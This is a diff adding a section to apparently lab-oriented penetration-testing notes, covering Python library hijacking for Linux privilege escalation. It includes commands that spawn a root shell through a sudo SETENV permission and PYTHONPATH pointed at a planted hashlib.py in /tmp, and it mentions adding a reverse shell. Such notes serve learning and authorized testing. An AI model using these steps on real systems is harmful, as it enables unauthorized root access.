@@ -906,10 +906,40 @@ which tar
 ````
 ./tar -xvf shadow.tar
 ````
+## Python Library Hijacking 
+![setenv](https://user-images.githubusercontent.com/75596877/170289480-53b814c0-636e-43bd-a0aa-156887408305.PNG)
+- From `sudo -l` output we see `SETENV` (means we can set the env variables when it is run as root) in addition to the python script that can be run as root
+![hashlib](https://user-images.githubusercontent.com/75596877/170289844-1d33fa11-e247-4004-8e04-e66668d03e80.PNG)
+- We see the `import hashlib` statement at the top, can hijack the library 
+- Python will look in the current directory or a specified path that we list due to the `SETENV` permission.
+- The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:
 
-
-
-
+- Directory of the script being executed
+````
+/usr/lib/python2.7
+/usr/lib/python2.7/plat-x86_64-linux-gnu
+/usr/lib/python2.7/lib-tk
+/usr/lib/python2.7/lib-old
+/usr/lib/python2.7/lib-dynload
+/usr/local/lib/python2.7/dist-packages
+/usr/lib/python2.7/dist-packages
+````
+- For other distributions, run the command below to get an ordered list of directories:
+````
+python -c 'import sys; print "\n".join(sys.path)'
+````
+- Can also use `locate hashlib.py` to figure out where the library is being executed from
+- Once the libary is located 
+- Copy the `hashlib.py` file to `/tmp or /dev/shm`
+- Can either try adding a python reverse shell to the file or:
+````
+python -c 'import os; os.system("/bin/sh")'
+python3 -c 'import os; os.system("/bin/sh")'
+`````
+- To conduct the priv esc now run:
+````
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+````
 
 
 
